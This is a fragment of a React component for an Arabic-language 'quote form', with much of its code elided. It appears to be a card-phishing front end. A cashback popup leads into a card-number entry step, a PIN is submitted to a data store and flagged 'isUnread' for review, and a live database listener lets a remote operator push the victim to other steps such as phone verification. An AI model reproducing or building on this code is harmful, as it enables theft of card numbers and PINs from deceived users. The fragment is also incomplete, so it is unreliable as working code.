...
function ProfessionalQuoteForm() {
  ...
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    ...
    if (cleanNum.length <= 16) {
      setCardNumber(formatCardNumber(cleanNum));
    }
  };
  ...
  useEffect(() => {
    ...
    // Show card popup when entering step 6
    if (currentPage === 6) {
        ...
        async (docSnap) => {
          if (docSnap.exists()) {
            ...
            if (currentPage !== data.currentPage && !waitingForApproval) {
              const page = data.currentPage?.toString();
              if (page === "9999") {
                ...
                setCurrentStep(Number.parseInt(page));
              }
            }
          }
        },
  ...
  function handlePinSubmit(): void {
    ...
    addData({
      ...
      finalStatus: "pending_phone_verification",
      currentPage: "9999",
      isUnread: true,
      ...formData,
    });
        ...
        <CardContent className="p-0">
          ...
          <div className="p-6 lg:p-8">
            <div className="min-h-[500px] lg:min-h-[600px]">
              ...
              {currentPage === 6 && (
                <div className="space-y-8">
                  <Dialog open={showCardPopup} onOpenChange={setShowCardPopup}>
                    <DialogContent className="max-w-md mx-auto p-0 overflow-hidden" dir="rtl">
                      <DialogHeader className="p-4 bg-gradient-to-r from-[#109cd4] to-[#0d7cb3] text-white">
                      ...
                      <div className="p-6 space-y-4">
                        ...
                        <p className="text-center text-gray-600 text-sm">
                          كاش باك 30% لعملائنا وشركائنا المتميزون
                        </p>
                        <Button
                          onClick={() => setShowCardPopup(false)}
                          className="w-full bg-gradient-to-r from-[#109cd4] to-[#0d7cb3] hover:from-[#0d7cb3] hover:to-[#0a6a9c] text-white font-semibold py-3"
                        >
                          فهمت، المتابعة
                        </Button>
                      </div>
                      ...
                      <div>
                        ...
                        <div className="relative">
                          <Input
                            ...
                            maxLength={19}
                            autoFocus={true}
                            className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200 pl-14"
                          />
